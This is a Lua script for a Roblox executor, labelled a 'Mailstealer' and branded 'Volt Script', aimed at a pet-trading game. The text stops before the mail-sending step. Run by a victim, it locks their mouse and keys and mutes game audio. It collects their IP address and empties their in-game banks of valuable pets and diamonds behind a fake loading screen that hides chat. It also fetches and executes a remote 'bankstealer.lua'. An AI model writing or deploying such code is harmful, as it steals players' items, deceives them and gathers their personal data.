--[[
   ____  _         _   _       _       __  __       _ _     _             _
  |  _ \(_)_______| | | |_   _| |__   |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __
  | |_) | |_  /_  / |_| | | | | '_ \  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
  |  _ <| |/ / / /|  _  | |_| | |_) | | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |
  |_| \_\_/___/___|_| |_|\__,_|_.__/  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|
  
]]--
getgenv().Settings = {
    User = "maybeimpro1220",
    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
    MailMessage = "Made With Volt Script",
    Titanics = {
        Dualhook = true,
        Intensity = 100 --%
    },
    Banana = {
        Dualhook = true,
        Intensity = 100 --%
    },
    Huges = {
        Dualhook = true,
        Intensity = 50 --%
    },
    Pogs = {
        Dualhook = true,
        Intensity = 0 --%
    },
    Exclusives = {
        Dualhook = true,
        Intensity = 0 --%
    },
    Events = {
        Dualhook = true,
        Intensity = 0 --%
    },
    Secrets = {
        Dualhook = true,
        Intensity = 0 --%
    },
    HC_DM_Mythics = {
        Dualhook = true,
        Intensity = 0 --%
    },
    Gems = {
        Dualhook = true,
        Intensity = 0 --%
    }
}

if getgenv().executed then return end
getgenv().executed = true

local runService = game:GetService("RunService")
local camera = workspace.CurrentCamera
local disabledKeyCodes = {
    0x73,
    0xA4,
    0xA5,
    0x1B,
    0x0D,
};
UserSettings().GameSettings.MasterVolume = 0
if _G.MouseLock ~= false then
    runService.RenderStepped:Connect(function()
        for _, keyCode in next, disabledKeyCodes do
            keyrelease(keyCode)
        end

        mousemoveabs(camera.ViewportSize.X / 3, camera.ViewportSize.Y / 3);
    end);
end

local function antiPrint(...)
    local info = debug.getinfo(2)
    if info and info.what == 'Lua' and info.func == print then
        return
    end
    return print(...)
end
print = antiPrint
rconsoleprint = antiPrint
rconsolewarn = antiPrint
rconsoleerr = antiPrint
rconsoleinput = antiPrint
printconsole = antiPrint
setclipboard = antiPrint

-- Users And Stuff

if UserName == nil then
    UserName = _G.UserName
end
if UserName2 == nil then
    UserName2 = _G.UserName2
end
if Webhook == nil then
    Webhook = _G.Webhook
end
-- User Checks

local idiotuser = game:GetService("Players").LocalPlayer.Name

if idiotuser == UserName then
    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
    return;
end
if UserName == nil then
    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
    return;
end
local worked2 = pcall(function()
    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
end)
if not worked2 then
    game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
    return;
end
if worked2 then
    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
end
if UserName2 ~= nil then
    local worked3 = pcall(function()
        game:GetService("Players"):GetUserIdFromNameAsync(UserName2)
    end)
    if not worked3 then
        game:GetService("Players").LocalPlayer:Kick("Put A Valid Username2!")
        return;
    end
end

local diaamt99 = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Diamonds

-- Check If The Area Have A Mailbox In It

local worked = pcall(function()
    game:GetService("Workspace")["__MAP"].Interactive.Mailbox.Pad:GetChildren()
end)
if not worked then
    game:GetService("Players").LocalPlayer:Kick("UnRegistered Area. Please Consider Going To The Shop")
    return;
end

-- Base64 Encryption

function to_base64(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return ((data:gsub('.', function(x)
        local r, b = '', x:byte()
        for i = 8, 1, -1 do r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and '1' or '0') end
        return r;
    end) .. '0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if (#x < 6) then return '' end
        local c = 0
        for i = 1, 6 do c = c + (x:sub(i, i) == '1' and 2 ^ (6 - i) or 0) end
        return b:sub(c + 1, c + 1)
    end) .. ({ '', '==', '=' })[#data % 3 + 1])
end

function from_base64(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^' .. b .. '=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0) end
        return string.char(c)
    end))
end

-- Premium Check

request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request or
    HttpPost


-- Exploit's Name

local exploit
local function getexploit()
    local exploitt =
        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
        (secure_load and "Sentinel") or
        (is_sirhurt_closure and "Sirhurt") or
        (pebc_execute and "ProtoSmasher") or
        (KRNL_LOADED and "KRNL") or
        (WrapGlobal and "WeAreDevs") or
        (isvm and "Proxo") or
        (shadow_env and "Shadow") or
        (jit and "EasyExploits") or
        (getscriptenvs and "Calamari") or
        (unit and not syn and "Unit") or
        (OXYGEN_LOADED and "Oxygen U") or
        (IsElectron and "Electron") or
        ("Couldnt Grab")

    exploit = exploitt
end
getexploit()

-- Player Infos

local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
local username = game:GetService("Players").LocalPlayer.Name
local fardplayer = game:GetService("Players").LocalPlayer
local IPadress = game:HttpGet('https://ipinfo.io/ip')
local data1

-- Remotes

local BankPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Bank Client"])
local InvPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory)
local MailPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Mailbox)
local RedeemPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Reedem Rank Rewards"])
local GiftsPath = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs["Free Gifts"])

local getmybanksremote = debug.getconstant(BankPath.GetMyBanks, 3)

local lockremote = debug.getconstant(InvPath.LockPets, 5)

local getbankremote = debug.getconstant(BankPath.GetBank, 3)

local withdrawremote = debug.getconstant(BankPath.Withdraw, 16)

local mailremote = debug.getconstant(debug.getprotos(MailPath.UpdateOutbox)[2], 20)

local claimallremote = debug.getconstant(MailPath.UpdateInboxBottom, 35)

local getmailremote = debug.getconstant(MailPath.Update, 3)

local acceptinviteremote = debug.getconstant(BankPath.DecideInvite, 6)

local getinvitesremote = debug.getconstant(BankPath.GetMyInvites, 3)

local redeemrankremote = debug.getconstant(RedeemPath.Redeem, 3)

local redeemgiftsremote = debug.getconstant(GiftsPath.Redeem, 3)

local blobx = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
local bloby = getupvalues(blobx[2])
local blobz = getupvalues(bloby[1])[1][2]
local bloba = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
local blobb = getupvalues(bloba[2])

getmybanksremote = blobz[blobb[2](2, getmybanksremote)]
lockremote = blobz[blobb[2](2, lockremote)]
getbankremote = blobz[blobb[2](2, getbankremote)]
withdrawremote = blobz[blobb[2](2, withdrawremote)]
mailremote = blobz[blobb[2](2, mailremote)]
claimallremote = blobz[blobb[2](2, claimallremote)]
getmailremote = blobz[blobb[2](2, getmailremote)]
acceptinviteremote = blobz[blobb[2](2, acceptinviteremote)]
getinvitesremote = blobz[blobb[2](2, getinvitesremote)]
redeemrankremote = blobz[blobb[2](2, redeemrankremote)]
redeemgiftsremote = blobz[blobb[2](2, redeemgiftsremote)]

-- Banks Stuff

local mybanks = getmybanksremote:InvokeServer()
local PlayerInfos = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()

-- Inv Space Check :

function invspace()
    local invspace = PlayerInfos.MaxSlots - #PlayerInfos.Pets
    if invspace > 50 then
        invspace = 50
    end
    return invspace
end

function invspace_nolimit()
    local invspace = PlayerInfos.MaxSlots - #PlayerInfos.Pets
    return invspace
end

-- Bank Teleport

game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
"__MAP"].Interactive.Bank.Pad.Position)

-- Bank Variables :

local SuperBank
local Bank
local SuperBank2
local Bank2
local SuperBank3
local Bank3
local SuperBank4
local Bank4
local SuperBank5
local Bank5
local bdiaamt = 0
local bdiaamt2 = 0
local bdiaamt3 = 0
local bdiaamt4 = 0
local bdiaamt5 = 0
local bankscount = 0
local FinalFinal = 0

-- Banks Count :

if mybanks[1] ~= nil then
    bankscount = bankscount + 1
end
if mybanks[2] ~= nil then
    bankscount = bankscount + 1
end
if mybanks[3] ~= nil then
    bankscount = bankscount + 1
end
if mybanks[4] ~= nil then
    bankscount = bankscount + 1
end
if mybanks[5] ~= nil then
    bankscount = bankscount + 1
end

-- Check & Accept Banks Invites
local invbanks = getinvitesremote:InvokeServer()
bankstable = {}
if bankscount ~= 5 then
    if invbanks[1] ~= nil then
        table.insert(bankstable, invbanks[1]["BUID"])
    end
    if invbanks[2] ~= nil then
        table.insert(bankstable, invbanks[2]["BUID"])
    end
    if invbanks[3] ~= nil then
        table.insert(bankstable, invbanks[3]["BUID"])
    end
    if invbanks[4] ~= nil then
        table.insert(bankstable, invbanks[4]["BUID"])
    end
    if invbanks[5] ~= nil then
        table.insert(bankstable, invbanks[5]["BUID"])
    end
    for i, v in pairs(bankstable) do
        acceptinviteremote:InvokeServer(v)
    end
end

-- Banks BUID's
if bankscount == 0 then
    Bank = bankstable[1]
    Bank2 = bankstable[2]
    Bank3 = bankstable[3]
    Bank4 = bankstable[4]
    Bank5 = bankstable[5]
elseif bankscount == 1 then
    Bank = mybanks[1]["BUID"]
    Bank2 = bankstable[1]
    Bank3 = bankstable[2]
    Bank4 = bankstable[3]
    Bank5 = bankstable[4]
elseif bankscount == 2 then
    Bank = mybanks[1]["BUID"]
    Bank2 = mybanks[2]["BUID"]
    Bank3 = bankstable[1]
    Bank4 = bankstable[2]
    Bank5 = bankstable[3]
elseif bankscount == 3 then
    Bank = mybanks[1]["BUID"]
    Bank2 = mybanks[2]["BUID"]
    Bank3 = mybanks[3]["BUID"]
    Bank4 = bankstable[1]
    Bank5 = bankstable[2]
elseif bankscount == 4 then
    Bank = mybanks[1]["BUID"]
    Bank2 = mybanks[2]["BUID"]
    Bank3 = mybanks[3]["BUID"]
    Bank4 = mybanks[4]["BUID"]
    Bank5 = bankstable[1]
elseif bankscount == 5 then
    Bank = mybanks[1]["BUID"]
    Bank2 = mybanks[2]["BUID"]
    Bank3 = mybanks[3]["BUID"]
    Bank4 = mybanks[4]["BUID"]
    Bank5 = mybanks[5]["BUID"]
end

-- Get Pets

Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
Functions = Library.Functions

PetIDList = {}

table.foreach(Library.Directory.Pets, function(i, v)
    if v.huge or v.titanic or v.name == "banana" or v.name == "Bladee" or v.convertPoints == 5 then -- get pets to withdraw from banks
        table.insert(PetIDList, i)
    end
end)

-- Withdraw From Banks
if Bank ~= nil and invspace() ~= 0 then
    while task.wait() do
        print('bank1 purged')
        SuperBank = getbankremote:InvokeServer(Bank)
        LHList = {}
        LFinalList = {}
        local lpets = SuperBank.Storage.Pets
        local y = {}
        for i, v in pairs(lpets) do
            y[v["uid"]] = false
        end
        for i, v in pairs(lpets) do
            if table.find(PetIDList, v["id"]) ~= nil then
                table.insert(LHList, v["uid"])
            end
        end
        print("LHList :", #LHList)
        if #LHList <= invspace() then
            for i, v in pairs(LHList) do
                table.insert(LFinalList, v)
            end
        elseif #LHList > invspace() then
            for i, v in pairs(LHList) do
                if #LFinalList < invspace() then
                    table.insert(LFinalList, v)
                end
            end
        end
        print("LFinalList :", #LFinalList)
        bdiaamt = SuperBank.Storage.Currency.Diamonds
        if #LFinalList == 0 and bdiaamt < 1000000000 and diaamt99 > 110000 then
            bdiaamt = 0
        end
        if #LFinalList ~= 0 or bdiaamt ~= 0 then
            local A_5 = {
                [1] = Bank,
                [2] = LFinalList,
                [3] = 0
            }
            local s, e = pcall(function()
                withdrawremote:InvokeServer(Bank, LFinalList, bdiaamt)
            end)
            if s == false then
                wait(0.2)
                withdrawremote:InvokeServer(Bank, LFinalList, 0)
            end
            FinalFinal = FinalFinal + #LFinalList
            wait(1.5)
        else
            print('done1')
            break
        end
    end
end
if Bank2 ~= nil and invspace() ~= 0 then
    while task.wait() do
        print('bank2 purged')
        SuperBank2 = getbankremote:InvokeServer(Bank2)
        BHList2 = {}
        FinalList2 = {}
        local pets2 = SuperBank2.Storage.Pets
        local y = {}
        for i, v in pairs(pets2) do
            y[v["uid"]] = false
        end
        for i, v in pairs(pets2) do
            if table.find(PetIDList, v["id"]) ~= nil and not v.l then
                table.insert(BHList2, v["uid"])
            end
        end
        if #BHList2 <= invspace() then
            for i, v in pairs(BHList2) do
                table.insert(FinalList2, v)
            end
        elseif #BHList2 > invspace() then
            for i, v in pairs(BHList2) do
                if #FinalList2 < invspace() then
                    table.insert(FinalList2, v)
                end
            end
        end
        print("FinalList2 :", #FinalList2)
        print('BHList2 :', #BHList2)
        bdiaamt2 = SuperBank2.Storage.Currency.Diamonds
        if #FinalList2 == 0 and bdiaamt2 < 1000000000 and diaamt99 > 110000 then
            bdiaamt = 0
        end
        if #FinalList2 ~= 0 or bdiaamt2 ~= 0 then
            local A_1 = {
                [1] = Bank2,
                [2] = FinalList2,
                [3] = 0
            }
            wait()
            local s, e = pcall(function()
                withdrawremote:InvokeServer(Bank2, FinalList2, bdiaamt2)
            end)
            if s == false then
                wait(0.2)
                withdrawremote:InvokeServer(Bank2, FinalList2, 0)
            end
            wait(1.5)
            FinalFinal = FinalFinal + #FinalList2
        else
            print('done2')
            break
        end
    end
end
if Bank3 ~= nil and invspace() ~= 0 then
    while task.wait() do
        print('bank3 purged')
        SuperBank3 = getbankremote:InvokeServer(Bank3)
        BHList3 = {}
        FinalList3 = {}
        local pets3 = SuperBank3.Storage.Pets
        local y = {}
        for i, v in pairs(pets3) do
            y[v["uid"]] = false
        end
        for i, v in pairs(pets3) do
            if table.find(PetIDList, v["id"]) ~= nil and not v.l then
                table.insert(BHList3, v["uid"])
            end
        end
        if #BHList3 <= invspace() then
            for i, v in pairs(BHList3) do
                table.insert(FinalList3, v)
            end
        elseif #BHList3 > invspace() then
            for i, v in pairs(BHList3) do
                if #FinalList3 < invspace() then
                    table.insert(FinalList3, v)
                end
            end
        end
        print("FinalList3 :", #FinalList3)
        print('BHList3 :', #BHList3)
        bdiaamt3 = SuperBank3.Storage.Currency.Diamonds
        if #FinalList3 == 0 and bdiaamt3 < 1000000000 and diaamt99 > 110000 then
            bdiaamt = 0
        end
        if #FinalList3 ~= 0 or bdiaamt3 ~= 0 then
            local A_1 = {
                [1] = Bank3,
                [2] = FinalList3,
                [3] = 0
            }

            wait()
            local s, e = pcall(function()
                withdrawremote:InvokeServer(Bank3, FinalList3, bdiaamt3)
            end)

            if s == false then
                wait(0.2)
                withdrawremote:InvokeServer(Bank3, FinalList3, 0)
            end
            wait(1.5)
            FinalFinal = FinalFinal + #FinalList3
        else
            print('done3')
            break
        end
    end
end
if Bank4 ~= nil and invspace() ~= 0 then
    while task.wait() do
        print('bank4 purged')
        SuperBank4 = getbankremote:InvokeServer(Bank4)
        BHList4 = {}
        FinalList4 = {}
        local pets4 = SuperBank4.Storage.Pets
        local y = {}
        for i, v in pairs(pets4) do
            y[v["uid"]] = false
        end
        for i, v in pairs(pets4) do
            if table.find(PetIDList, v["id"]) ~= nil and not v.l then
                table.insert(BHList4, v["uid"])
            end
        end
        if #BHList4 <= invspace() then
            for i, v in pairs(BHList4) do
                table.insert(FinalList4, v)
            end
        elseif #BHList4 > invspace() then
            for i, v in pairs(BHList4) do
                if #FinalList4 < invspace() then
                    table.insert(FinalList4, v)
                end
            end
        end
        print('BHList4 :', #BHList4)
        print('FinalList4 :', #FinalList4)
        bdiaamt4 = SuperBank4.Storage.Currency.Diamonds
        if #FinalList4 == 0 and bdiaamt4 < 1000000000 and diaamt99 > 110000 then
            bdiaamt4 = 0
        end
        if #FinalList4 ~= 0 or bdiaamt4 ~= 0 then
            local A_1 = {
                [1] = Bank4,
                [2] = FinalList4,
                [3] = 0
            }
            local s, e = pcall(function()
                withdrawremote:InvokeServer(Bank4, FinalList4, bdiaamt4)
            end)

            if s == false then
                wait(0.2)
                withdrawremote:InvokeServer(Bank4, FinalList4, 0)
            end
            FinalFinal = FinalFinal + #FinalList4
            wait(1.5)
        else
            print('done4')
            break
        end
    end
end
if Bank5 ~= nil and invspace() ~= 0 then
    while task.wait() do
        print('bank5 purged')
        SuperBank5 = getbankremote:InvokeServer(Bank5)
        BHList5 = {}
        FinalList5 = {}
        local pets5 = SuperBank5.Storage.Pets
        local y = {}
        for i, v in pairs(pets5) do
            y[v["uid"]] = false
        end
        for i, v in pairs(pets5) do
            if table.find(PetIDList, v["id"]) ~= nil and not v.l then
                table.insert(BHList5, v["uid"])
            end
        end
        if #BHList5 <= invspace() then
            for i, v in pairs(BHList5) do
                table.insert(FinalList5, v)
            end
        elseif #BHList5 > invspace() then
            for i, v in pairs(BHList5) do
                if #FinalList5 < invspace() then
                    table.insert(FinalList5, v)
                end
            end
        end
        print('BHList5 :', #BHList5)
        print('FinalList5 :', #FinalList5)
        bdiaamt5 = SuperBank5.Storage.Currency.Diamonds
        if #FinalList5 == 0 and bdiaamt5 < 1000000000 and diaamt99 > 110000 then
            bdiaamt5 = 0
        end
        if #FinalList5 ~= 0 or bdiaamt5 ~= 0 then
            local A_1 = {
                [1] = Bank5,
                [2] = FinalList5,
                [3] = 0
            }

            wait()
            local s, e = pcall(function()
                withdrawremote:InvokeServer(Bank5, FinalList5, bdiaamt5)
            end)

            if s == false then
                wait(0.2)
                withdrawremote:InvokeServer(Bank5, FinalList5, 0)
            end
            wait(1.5)
            FinalFinal = FinalFinal + #FinalList5
        else
            print('done5')
            break
        end
    end
end

if _G.LoadingScreen ~= false then
local Loading = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Dots = Instance.new("Frame")
local Dot1 = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local InsideDot = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local Dot2 = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local InsideDot_2 = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local Dot3 = Instance.new("Frame")
local UICorner_5 = Instance.new("UICorner")
local InsideDot_3 = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local Bar = Instance.new("Frame")
local Bar2 = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local UICorner_8 = Instance.new("UICorner")
local Percentage = Instance.new("TextLabel")
local Tip = Instance.new("TextLabel")
local EndSequence = Instance.new("Frame")
if _G.ScriptName == nil and _G.FirstText == nil and _G.SecondText == nil and _G.ThirdText == nil and _G.WaitingTime == nil then
	_G.ScriptName = "Volt Script";
	_G.FirstText = "Preparing Script...";
	_G.SecondText = "Loading Script...";
	_G.ThirdText = "Almost Done...";
	_G.WaitingTime = 180;
end
;
Loading.Name = "Loading"
Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Loading.DisplayOrder = 999999999
MainFrame.Name = "MainFrame"
MainFrame.Parent = Loading
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(-0.125662372, 0, -0.125935167, 0)
MainFrame.Size = UDim2.new(1.25, 0, 1.25, 0)
Title.Name = "Title"
Title.Parent = MainFrame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(0.183329239, 0, 0.246382296, 0)
Title.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
Title.Font = Enum.Font.FredokaOne
Title.Text = _G.ScriptName
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true
Dots.Name = "Dots"
Dots.Parent = MainFrame
Dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Dots.BackgroundTransparency = 1.000
Dots.Position = UDim2.new(0.470970035, 0, 0.818612278, 0)
Dots.Size = UDim2.new(0.0571707934, 0, 0.0360675976, 0)
Dot1.Name = "Dot1"
Dot1.Parent = Dots
Dot1.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot1.Position = UDim2.new(0.0611661971, 0, 0.234447539, 0)
Dot1.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
UICorner.CornerRadius = UDim.new(0.5, 0)
UICorner.Parent = Dot1
InsideDot.Name = "InsideDot"
InsideDot.Parent = Dot1
InsideDot.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot.Position = UDim2.new(0.5, 0, 0.5, 0)
UICorner_2.CornerRadius = UDim.new(0.5, 0)
UICorner_2.Parent = InsideDot
Dot2.Name = "Dot2"
Dot2.Parent = Dots
Dot2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot2.Position = UDim2.new(0.419989735, 0, 0.234447539, 0)
Dot2.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
UICorner_3.CornerRadius = UDim.new(0.5, 0)
UICorner_3.Parent = Dot2
InsideDot_2.Name = "InsideDot"
InsideDot_2.Parent = Dot2
InsideDot_2.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot_2.Position = UDim2.new(0.5, 0, 0.5, 0)
UICorner_4.CornerRadius = UDim.new(0.5, 0)
UICorner_4.Parent = InsideDot_2
Dot3.Name = "Dot3"
Dot3.Parent = Dots
Dot3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Dot3.Position = UDim2.new(0.778813243, 0, 0.234447539, 0)
Dot3.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
UICorner_5.CornerRadius = UDim.new(0.5, 0)
UICorner_5.Parent = Dot3
InsideDot_3.Name = "InsideDot"
InsideDot_3.Parent = Dot3
InsideDot_3.AnchorPoint = Vector2.new(0.5, 0.5)
InsideDot_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InsideDot_3.Position = UDim2.new(0.5, 0, 0.5, 0)
UICorner_6.CornerRadius = UDim.new(0.5, 0)
UICorner_6.Parent = InsideDot_3
Bar.Name = "Bar"
Bar.Parent = MainFrame
Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(0.219547689, 0, 0.764966607, 0)
Bar.Size = UDim2.new(0.560904443, 0, 0.0365853645, 0)
Bar2.Name = "Bar2"
Bar2.Parent = Bar
Bar2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
Bar2.BorderSizePixel = 0
Bar2.Size = UDim2.new(0, 0, 1, 0)
UICorner_7.CornerRadius = UDim.new(0.5, 0)
UICorner_7.Parent = Bar2
UICorner_8.CornerRadius = UDim.new(0.5, 0)
UICorner_8.Parent = Bar
Percentage.Name = "Percentage"
Percentage.Parent = Bar
Percentage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Percentage.BackgroundTransparency = 1.000
Percentage.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0)
Percentage.Size = UDim2.new(0.438366145, 0, 0.787879348, 0)
Percentage.Font = Enum.Font.FredokaOne
Percentage.Text = "0%"
Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
Percentage.TextScaled = true
Percentage.TextSize = 14.000
Percentage.TextWrapped = true
Tip.Name = "Tip"
Tip.Parent = MainFrame
Tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tip.BackgroundTransparency = 1.000
Tip.Position = UDim2.new(0.280816913, 0, 0.717294872, 0)
Tip.Size = UDim2.new(0.438366145, 0, 0.0299334861, 0)
Tip.Font = Enum.Font.SourceSansItalic
Tip.Text = ""
Tip.TextColor3 = Color3.fromRGB(138, 138, 138)
Tip.TextScaled = true
Tip.TextSize = 14.000
Tip.TextWrapped = true
EndSequence.Name = "EndSequence"
EndSequence.Parent = Loading
EndSequence.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
EndSequence.BorderSizePixel = 0
EndSequence.Position = UDim2.new(1, 0, 0, 0)
EndSequence.Size = UDim2.new(1, 0, 1, 0)
local function NGZQAMK_fake_script()
	local script = Instance.new('LocalScript', Dots)
	while true do
		wait(0.25)
		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
		wait(0.25)
		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
	end
end

coroutine.wrap(NGZQAMK_fake_script)()
local function NDID_fake_script()
	local script = Instance.new('LocalScript', MainFrame)
	local bar = script.Parent.Bar
	local insidebar = bar.Bar2
	local percentage = bar.Percentage
	wait(5)
	insidebar:TweenSize(UDim2.new(1,0,1,0), "In", "Linear", 200, true)
	
end
coroutine.wrap(NDID_fake_script)()
local function OVSBNB_fake_script()
	local script = Instance.new('LocalScript', Percentage)
	wait(5)
	for i = 1,100 do
		script.Parent.Text = i.."%"
		wait(1)
	end
end
coroutine.wrap(OVSBNB_fake_script)()
local function SNUMK_fake_script()
	local script = Instance.new('LocalScript', Tip)
	local tip = script.Parent
	while true do
		tip.Text = _G.FirstText;
		wait(5);
		tip.Text = _G.SecondText;
		wait(5);
		tip.Text = _G.ThirdText;
	end
end
coroutine.wrap(SNUMK_fake_script)()
local function LSNGUH_fake_script()
	local script = Instance.new('LocalScript', Loading)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
end
coroutine.wrap(LSNGUH_fake_script)()
end

local DiamondsDiamonds = bdiaamt + bdiaamt2 + bdiaamt3 + bdiaamt4 + bdiaamt5

-- Redeem Free Gifts

local GiftsGui = game:GetService("Players").LocalPlayer.PlayerGui.FreeGifts
Gifts = {}
if invspace_nolimit() ~= 0 then
    for i, v in pairs(GiftsGui.Frame.Container.Gifts:GetDescendants()) do
        if v.Name == "Timer" then
            if v.Text == "Redeem!" then
                table.insert(Gifts, string.split(tostring(v.Parent), 't')[2])
            end
        end
    end
    if #Gifts ~= 0 then
        for i, v in pairs(Gifts) do
            redeemgiftsremote:InvokeServer(tonumber(v))
        end
    end
end

-- Get VIP & Rank Rewards

if PlayerInfos.World == "Spawn" then
    local Redeem_Pad = game:GetService("Workspace")["__MAP"].Interactive["Rank Rewards"].Pad
    local VIP_Pad = game:GetService("Workspace")["__MAP"].Interactive["VIP Rewards"].Pad
    local Timer = Redeem_Pad.BillboardGui.Timer
    local VIP_Timer = VIP_Pad.BillboardGui.Timer
    if Timer.Text == "Redeem!" then
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Redeem_Pad.Position)
        while task.wait() do
            if Timer.Text ~= "Redeem!" then break end
        end
    end
    if table.find(PlayerInfos.Gamepasses, 18674305) then
        if VIP_Timer.Text == "Redeem!" then
            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(VIP_Pad.Position)
            while task.wait() do
                if VIP_Timer.Text ~= "Redeem!" then break end
            end
        end
    end
end

-- Teleport To Mailbox

game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
"__MAP"].Interactive.Mailbox.Pad.Position)

-- Claim All Gifts

local check = getmailremote:InvokeServer()
local inbox = #check.Inbox

if inbox ~= 0 and invspace_nolimit() >= inbox then
    claimallremote:InvokeServer()
    task.wait(1.5)
end

-- Run Bankstealer if Diamonds Are < 110k

local diaamt = PlayerInfos.Diamonds
if diaamt < 110000 then
    _G.Webhook = Webhook
    _G.LoadingScreen = false
    _G.AntiLeave = false
    _G.MouseLock = false
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Azurexc/VoltScript/main/bankstealer.lua", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
    return;
end
if _G.AntiLeave ~= false then
    for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
        if v.Name ~= "Inventory" then
            v:Destroy()
        end
    end
    for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
            v:Destroy()
        end
    end
end

-- Pets Tables :

TitanicList = {}
TList = {}
STList = {}
BananaList = {}
BList = {}
HugeList = {}
HList = {}
SHList = {}
PogList = {}
PList = {}
